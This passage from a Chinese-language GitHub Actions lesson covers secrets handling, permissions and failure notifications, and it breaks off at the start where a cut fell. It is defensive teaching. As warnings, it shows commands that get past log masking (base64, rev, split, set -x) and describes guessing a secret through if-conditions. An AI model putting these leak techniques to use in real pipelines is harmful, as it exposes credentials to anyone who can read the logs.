$name 是 "WEBHOOK"
\$$name → 先展开成 $WEBHOOK，再 eval 一次 → 取到值
```

**这个写法有点绕，但能避免写三遍 `if`。**

**⚠️ `eval` 有注入风险。** 这里 `name` 是你自己写死的，所以安全。**如果 `name` 来自用户输入，绝对不能这么写。**

## 错误 2：在 `if:` 里直接用 secrets

**操作：**

```yaml
      - name: 有 webhook 才发通知
        if: ${{ secrets.WECOM_WEBHOOK != '' }}
        run: curl ...
```

**会怎样：**

**workflow 文件直接不合法：**

```text
Invalid workflow file: .github/workflows/build.yml#L88
Unrecognized named-value: 'secrets'. Located at position 1 within expression: secrets.WECOM_WEBHOOK != ''
```

**逐段读：**

| 部分 | 意思 |
|---|---|
| `Invalid workflow file` | 文件不合法 |
| `#L88` | 第 88 行 |
| `Unrecognized named-value: 'secrets'` | **`if` 里不认 `secrets` 这个上下文** |
| `Located at position 1 within expression` | 在你的表达式第 1 个字符就出错了 |

**为什么：**

```text
GitHub 对 `if:` 的求值发生在"分配 runner 之前"
那时候不该把 secrets 交给表达式引擎
（否则你就能用 if 把 secret 一位一位试出来）
```

**这是一个安全设计：** 如果 `if` 能读 secrets，你就能写：

```yaml
if: secrets.KEY[0] == 'a'
```

**然后通过"红/绿"一位一位猜出整个密钥。**

**怎么修：用 `env` 中转。**

```yaml
    env:
      HAS_WEBHOOK: ${{ secrets.WECOM_WEBHOOK != '' }}

    steps:
      - name: 有 webhook 才发通知
        if: env.HAS_WEBHOOK == 'true'
        run: curl ...
```

**原理：**

```text
env 的赋值发生在"注入阶段"，允许用 secrets
if 读 env，不直接读 secrets
```

**⚠️ 注意 `== 'true'` 而不是 `== true`。**

**`env` 里的值永远是字符串。** `'true'` 是字符串，`true` 是布尔。

**写 `== true` 会永远不成立。** 这个坑很常见。

## 错误 3：`echo` secret 到日志

**操作：**

```yaml
      - run: echo "webhook=${{ secrets.WECOM_WEBHOOK }}" >> $GITHUB_OUTPUT
```

**会怎样：**

**日志里：**

```text
webhook=***
```

**看起来安全。**

**但 `$GITHUB_OUTPUT` 那个文件里的内容是**明文**。**

**如果后面有一步 `cat $GITHUB_OUTPUT`：**

```text
***     ← 仍然打码
```

**还是安全的。** GitHub 的打码是"输出时匹配"。

**真正危险的是这些：**

```yaml
      - run: echo "${{ secrets.WECOM_WEBHOOK }}" | base64
      - run: echo "${{ secrets.WECOM_WEBHOOK }}" | rev
      - run: echo "${{ secrets.WECOM_WEBHOOK }}" > /tmp/a && split -b 10 /tmp/a && cat /tmp/a*
```

**前两个绕过打码，第三个把密钥拆成多行（如果每段不够长，打码可能失效）。**

**还有一种最容易被忽略：**

```yaml
      - run: |
          set -x
          curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" ...
```

**`set -x` 会让日志变成：**

```text
+ curl -H 'Authorization: Bearer sk-真实值' ...
```

**打码会把它变成 `***`**，但**如果这个值被 shell 加上了引号或转义**，匹配可能失败。

**所以规则是：**

```text
① 永远不要主动 echo / cat / printenv 一个 secret
② 调试时只打印"长度"或"前 3 位"
③ 用完 `set -x` 立刻删
```

**打印长度的写法：**

```bash
echo "TOKEN 长度: ${#TOKEN}"
```

**`${#VAR}` 是什么：** 变量值的字符数。

**它能告诉你"secret 是不是空的"，但不泄露内容。**

## 错误 4：`permissions` 收得太狠

**操作：** 在 `build.yml` 里只写：

```yaml
permissions:
  packages: write
```

**（漏了 `contents: read`）**

**会怎样：**

**checkout 那一步失败：**

```text
Run actions/checkout@v4
Syncing repository: yourname/ci-lab
...
remote: Repository not found.
Error: fatal: repository 'https://github.com/yourname/ci-lab/' not found
```

**或者：**

```text
Error: fatal: could not read Username for 'https://github.com': terminal prompts disabled
```

**为什么：**

```text
permissions 写了就是"全量替换"
contents 没写 → 默认 none
→ token 不能读私有仓库
→ checkout 拿不到代码
→ 报"仓库不存在"（而不是"没权限"，因为 GitHub 不告诉你"存在但你不能看"）
```

**"报不存在而不是没权限"是一个安全惯例：**

```text
如果告诉你"存在但你没权限"，你就能用它探测"哪些私有仓库存在"
```

**这个惯例在很多系统里都有（数据库登录、S3 桶）。**

**怎么修：**

```yaml
permissions:
  contents: read
  packages: write
```

**怎么快速定位这类问题：**

```text
① 报错在 checkout → 先怀疑 contents
② 报错在登录/推送 → 先怀疑 packages
③ 报错在"取消别的运行" → 怀疑 actions: write
```

## 错误 5：webhook 写进 yml

**操作：**

```yaml
      - run: curl -X POST "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=abc-123-real-key" -d '...'
```

**会怎样：**

**它能工作。**

**然后你的仓库被改成 Public，或者被 fork，或者你自己某天开了个 issue 贴了 yml 片段。**

**风险链条：**

```text
webhook URL 泄露
→ 任何人能往你的群发消息
→ 他们能发钓鱼链接（"点这里重新登录 GitHub"）
→ 你的合伙人/客户在群里点
→ 账号被盗
```

**这不是"发垃圾消息"这么简单。** 群机器人是一个"可信来源"，钓鱼成功率很高。

**更严重的：**

```text
如果那个群里有人是你的客户
他们会以为"这条消息来自你的系统"
```

**怎么修：**

```text
① 立刻在企业微信后台"移除机器人"（这会让旧 URL 失效）
② 重新建一个机器人
③ 新 URL 放进 secrets
④ 从 Git 历史里……删不掉，所以必须做第 ① 步
```

**⚠️ 注意第 ① 步：**

```text
只是"删掉 yml 里那一行"是不够的
URL 已经在 Git 历史里，任何人 clone 都能看到
唯一有效的是"让 URL 失效"
```

**这就是"吊销 > 删除"的又一个例子。**

## 错误 6：`notify` 没有 `needs`

**操作：**

```yaml
  notify:
    name: 失败通知
    if: failure()
    runs-on: ubuntu-latest
```

**会怎样：**

**notify 永远显示 `⊘ skipped`。**

**为什么：**

```text
没有 needs → notify 和其他 job 同时开始
开始时还没有任何 job 失败
→ failure() 为 false
→ 跳过
```

**这是一个"静默失效"：**

```text
它不报错，它只是永远不发通知
→ 你以为有通知，其实没有
→ 出事的时候没人告诉你
```

**怎么发现：**

```text
去 Actions 页面看一次失败的运行
Job 列表里 notify 是不是 ⊘ skipped
```

**怎么修：**

```yaml
    needs: [test, build, deploy]
    if: failure()
```

**⚠️ 另一个变体：`needs` 写了一个不存在的 job 名。**

```yaml
    needs: [tests]     # 实际叫 test
```

**会怎样：**

```text
Invalid workflow file
The workflow is not valid. .github/workflows/build.yml (Line: 95, Col: 5):
Job 'notify' depends on unknown job 'tests'.
```

**这个报错很清楚。** 但只在"文件保存/push 后"才出现。

**`actionlint` 能在本地抓到这个（第 205 节课提过）。**

## 错误 7：通知在"部署失败"时不发

**场景：** 你的 `needs` 只写了 `[test, build]`，漏了 `deploy`。

**会怎样：**

```text
test  ✅
build ✅
deploy ❌   ← 部署失败了
notify ⊘   ← 没跑！
```

**为什么：**

```text
notify 的 needs 里没有 deploy
所以 deploy 的失败不在它的"关注范围"内
```

**这是最讽刺的情况：**

```text
你最需要通知的，就是"部署失败"
而你的配置恰好漏了部署
```

**怎么修：**

```yaml
    needs: [test, build, deploy]
```

**并且：每次加新 job，都要问一句"notify 的 needs 里要不要加它"。**

**一个更好的办法：**

```yaml
    needs: [test, build, deploy]
    if: always() && contains(needs.*.result, 'failure')
```

**`always()` 先让 job 一定被考虑，再用 `contains` 判断有没有失败。**

**为什么不直接用 `failure()`：**

```text
`failure()` 在"某个 needs 被 skipped"时行为微妙
比如 build 因为 test 失败而 skipped
→ failure() 可能为 true，也可能为 false（取决于版本和组合）
```

**用 `contains(needs.*.result, 'failure')` 是更明确的写法。**

**它会精确检查"有没有哪个 job 的结果是 failure"。**

## 错误 8：邮件没收到

**操作：** 什么都没配，只靠 GitHub 默认邮件。

**会怎样：**

**你可能收不到。原因有五种：**

| 原因 | 怎么查 |
|---|---|
| 通知设置关了 | `Settings → Notifications → Actions` 有没有勾 |
| 邮箱没验证 | `Settings → Emails` 看有没有 `Unverified` |
| 是别人触发的 | 默认只通知"触发者" |
| 进了垃圾箱 | 搜 `[你的用户名/ci-lab]` |
| 你 push 的是一次"成功"的运行 | 成功默认不发 |

**最容易被忽略的是第三条：**

```text
如果是"定时任务"或"别人 push"触发的失败
你的邮箱不会收到
```

**所以：**

```text
邮件适合"我一个人开发，我自己 push"
群机器人适合"任何情况都要知道"
```

**我的建议：两个都配。**

```text
邮件当"备份"（哪怕进垃圾箱，搜得到）
群机器人当"主通道"（手机推送）
```

**验证邮件能不能通：**

**故意让一个 workflow 失败（错误 2 里那个 `if` 的写法就能让文件不合法）。**

**但注意：**

```text
"workflow 文件不合法"这种失败，GitHub 不发邮件
因为它根本没跑
```

**你必须让一个"真的跑起来的 job"失败，才会收到邮件。**

**用第 5.8 节那个"故意失败的测试"。**

---

# 第 7 步：写学习笔记（10 分钟）

**把下面的模板复制到 `02-笔记/NOTES.md`，然后填空。**

````markdown
# 第 209 节课学习笔记

## 一、密钥泄露的四条路径

1.
2.
3.
4.

哪一条我差点踩到：

## 二、"删掉" vs "吊销"

为什么删文件不能解决问题：

`git log --all -p | grep "ghp_"` 我查到了什么：

正确的处理顺序（三步）：

1.
2.
3.

## 三、我的 `secrets:check` 脚本

它查了哪几种格式：

它查了历史吗：

它的三个局限：

## 四、Secrets 的三种级别

| 级别 | 在哪配 | 谁能用 | 我用了哪个 |
|---|---|---|---|
| 仓库级 | | | |
| 环境级 | | | |
| 组织级 | | | |

`environment: production` 做了哪三件事：

## 五、我的 permissions

| 文件 | permissions 写了什么 | 为什么 |
|---|---|---|
| `check.yml` | | |
| `test.yml` | | |
| `build.yml` | | |

为什么"写了 permissions 就是全量替换"：

`write-all` 危险在哪：

## 六、fork 的 PR

fork 的 PR 里 secrets 是什么：

`GITHUB_TOKEN` 是什么权限：

为什么 GitHub 要这么设计（写出攻击步骤）：

`pull_request_target` 为什么危险：

## 七、我的 `notify` job

贴完整内容：

```yaml

```

`needs` 里写了哪几个 job：

`if:` 写的是什么：

我为什么选"只发失败"而不是"成功也发"：

## 八、通知结果

企业微信返回的 JSON：

我第一次收到通知的时间：

消息内容：

我点那个链接了吗，跳对了没：

## 九、八个错误

| 错误 | 现象 | 根本原因 |
|---|---|---|
| secret 名拼错 | | |
| `if` 里用 secrets | | |
| echo 到日志 | | |
| permissions 太狠 | | |
| webhook 写进 yml | | |
| notify 没有 needs | | |
| needs 漏了 deploy | | |
| 邮件没收到 | | |

## 十、我还不懂的词

-
-

## 十一、完成检查

- [ ] 我用 `git log` 查过仓库历史里有没有密钥
- [ ] 我有一个 `secrets:check` 脚本，能跑出"没有发现"
- [ ] 三个 workflow 的 `permissions` 都显式写了
- [ ] 我没有用 `write-all`
- [ ] 我建了群机器人，webhook 在 secrets 里
- [ ] `notify` job 有 `needs`，覆盖了 test/build/deploy
- [ ] 我收到过一条真实的失败通知，并点开过链接
- [ ] 我知道 `if:` 里不能用 secrets，也知道为什么
````

---

# 第 8 步：课后练习

## 练习一：给 secrets 建一份清单

**要求：**

1. 在仓库根目录建 `SECRETS.md`；
2. 列出每个 secret 的名字、用途、谁生成、什么时候轮换；
3. **不写任何真值**；
4. commit（这个文件可以进仓库）。

**记录：** 你有几个 secret？哪几个"其实可以删"？

**思考题：** 如果 `SECRETS.md` 里写"`OLD_TOKEN` 已废弃"，为什么不直接删掉它？

## 练习二：把 permissions 收到最紧

**要求：**

1. 把 `build.yml` 的 `permissions` 从 workflow 级改成 job 级；
2. build job 给 `contents: read` + `packages: write`；
3. deploy job 只给 `contents: read`；
4. 跑一次，确认还能成功。

**记录：** 改之前/之后各 job 的权限表。

**思考题：** deploy job 真的需要 `contents: read` 吗？如果删掉会怎样？

## 练习三：让通知带上"哪个 job 失败"

**要求：**

1. 在通知内容里加上失败的 job 名；
2. 提示：`needs.*.result` 是个数组，但没有"名字"；
3. 想一个办法（两个方案：分开写三个 if，或者用 `toJSON(needs)`）。

**记录：** 你的写法，和实际收到的消息内容。

**思考题：** `toJSON(needs)` 会把整个 needs 上下文打出来，里面有没有敏感信息？

## 练习四：制造一次"通知也失败"

**要求：**

1. 把 `WECOM_WEBHOOK` 改成一个假的 URL；
2. 让 test 失败；
3. 看 notify job 的日志和结论。

**记录：** curl 返回什么？notify job 是红还是绿？

**思考题：** 如果 notify 本身失败了，你怎么知道"通知没发出去"？（提示：这就是"监控监控系统"的问题）

## 练习五：模拟一次密钥泄露

**要求：**

1. 假装你的 webhook URL 泄露了（写在一张纸上，或者贴到一个只有你能看到的文件里）；
2. 写出完整的处理步骤（至少 6 步）；
3. 检查你的步骤里有没有"吊销"这一步。

**记录：** 步骤清单。

**思考题：** 如果泄露的是 `SSH_PRIVATE_KEY`，处理步骤有什么不同？

---

# 第 9 步：最终验收

## A. 概念

- [ ] 我能说出密钥泄露的四条路径
- [ ] 我知道"删掉"不等于"吊销"，并知道为什么
- [ ] 我知道 `permissions` 写了就是全量替换
- [ ] 我知道 `if:` 里为什么不能直接用 `secrets`
- [ ] 我知道 `notify` 为什么必须有 `needs`

## B. 实操

- [ ] 我有一个 `secrets:check` 脚本，并且加进了 CI
- [ ] 三个 workflow 都显式写了 `permissions`，没有 `write-all`
- [ ] 我建了群机器人，webhook 在 secrets 里，yml 里只有 `${{ secrets.XXX }}`
- [ ] `notify` job 的 `needs` 包含 test、build、deploy
- [ ] 我收到过至少一条真实的失败通知
- [ ] 通知里有仓库名、短 sha、触发人、可点的链接

## C. 排错

- [ ] 我见过 `Unrecognized named-value: 'secrets'`
- [ ] 我见过 `could not read Username for 'https://github.com'`（permissions 太狠）
- [ ] 我见过 `curl: (3) URL using bad/illegal format`（secret 名拼错）
- [ ] 我见过 `notify` 显示 `⊘ skipped`
- [ ] 我知道 `{"errcode":93000}` 时 curl 退出码仍是 0

## D. 交付

- [ ] `SECRETS.md` 写好了，没有任何真值
- [ ] 我没有在日志里 echo / cat / printenv 过任何 secret
- [ ] 我的仓库历史里没有密钥（`git log --all -p | grep` 查过）
- [ ] `notify` 真的跑过一次（不是 skipped）

## E. 笔记

- [ ] `NOTES.md` 填完
- [ ] 贴了完整的 `notify` job
- [ ] 记录了企业微信返回的 JSON

## 本节课要能说出口的一句话

> **密钥泄露之后删掉是没有用的，唯一有效的是吊销；而流水线最危险的失败不是"红"，是"红了但没人知道"——所以失败通知必须配，而且要真的收到过一次。**

---

# 附：常见问题速查

| 现象 | 原因 | 怎么做 |
|---|---|---|
| secret 是空字符串 | 名字拼错 / 没配 | 加 `-z` 检查，打印长度 |
| `Unrecognized named-value: 'secrets'` | `if:` 里直接用了 secrets | 用 `env` 中转 |
| `could not read Username for ...` | `permissions` 漏了 `contents: read` | 补上 |
| `denied: permission_denied` | 漏了 `packages: write` | 补上 |
| `curl: (3) URL using bad...` | URL 为空（secret 没取到） | 检查 secret 名 |
| `notify` 一直 skipped | 没有 `needs` / `if` 写错 | 加 `needs` + `if: failure()` |
| 部署失败但没通知 | `needs` 漏了 deploy | 加上 |
| 群消息没到但 job 绿了 | 平台返回错误码，curl 仍是 0 | 检查响应里的 `errcode` |
| `invalid webhook url` | webhook 被移除 / key 失效 | 重建机器人 |
| `api freq out of limit` | 发得太频繁 | 降低频率，或只发失败 |
| 邮件收不到 | 只通知触发者 / 设置关了 | 用群机器人兜底 |
| `write-all` 后一切正常 | 正常，但风险已埋下 | 改成具体权限 |
| action 的 `@main` 分支 | 作者改了你就中招 | 固定到 `@v4` |
| fork PR 里登录失败 | secrets 为空 | `if: github.event_name != 'pull_request'` |
| `set -x` 后日志有明文 | `-x` 会展开变量 | 调试完删掉 |
